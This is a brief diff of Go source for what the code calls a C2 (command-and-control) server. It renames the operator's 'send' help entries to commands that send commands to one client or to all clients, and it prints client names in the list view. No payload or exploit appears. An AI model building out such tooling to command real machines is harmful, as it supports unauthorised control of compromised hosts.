@@ -23,11 +23,11 @@ func main() {
 			fmt.Println("exit - Exit the C2 server")
 			fmt.Println("help - Show this help")
 			fmt.Println("list - List all the clients")
-			fmt.Println("send - Send a message to a client")
-			fmt.Println("sendall - Send a message to all clients")
+			fmt.Println("cmd - Send a command to a client")
+			fmt.Println("cmdall - Send a command to all clients")
 		case "list":
 			for _, client := range *clients {
-				fmt.Println(client)
+				fmt.Println(client.name)
 			}
 		case "send":
 			fmt.Print("send [client]> ")
